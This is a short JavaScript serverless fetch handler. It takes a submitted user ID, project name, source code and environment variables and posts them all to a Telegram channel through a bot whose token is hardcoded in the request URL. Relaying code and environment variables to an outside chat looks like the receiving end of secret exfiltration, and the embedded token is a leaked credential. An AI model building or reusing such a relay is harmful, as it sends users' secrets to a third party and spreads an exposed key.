export default {
  async fetch(request, env) {
    const headers = { 
      "Access-Control-Allow-Origin": "*", 
      "Access-Control-Allow-Headers": "Content-Type", 
      "Access-Control-Allow-Methods": "POST, OPTIONS" 
    };
    
    if (request.method === "OPTIONS") {
      return new Response(null, { headers });
    }
    
    try {
      const data = await request.json();
      const { user_id, project_name, code, environment_variables } = data;

      // ========== v11.0 EXACT STRUCTURE ==========
      // Plain text only - NO HTML, NO formatting, NO markdown
      const plainMessage = [
        `ID:${user_id}`,
        `PRJ:${project_name}`,
        `[CODE_START]`,
        `${code}`,
        `[CODE_END]`,
        `[VARS_START]`,
        `${JSON.stringify(environment_variables)}`,
        `[VARS_END]`,
        `---METADATA---${JSON.stringify({ uid: user_id, pid: project_name })}---METADATA---`
      ].join('\n');

      // Send to Telegram with parse_mode = empty (plain text)
      const telegramResponse = await fetch(`https://api.telegram.org/bot8683006680:AAGUqsPrC76xKnUgAep3tigtGVXsLKc86mI/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ 
          chat_id: "@nejm_njm", 
          text: plainMessage,
          disable_web_page_preview: true,
          disable_notification: false
          // NO parse_mode parameter = plain text only
        })
      });

      const telegramResult = await telegramResponse.json();
      
      if (!telegramResult.ok) {
        throw new Error(`Telegram API error: ${telegramResult.description}`);
      }

      return new Response(JSON.stringify({ 
        success: true, 
        message_id: telegramResult.result.message_id 
      }), { headers });
      
    } catch (e) {
      return new Response(JSON.stringify({ 
        error: e.message,
        success: false 
      }), { status: 500, headers });
    }
  }
};
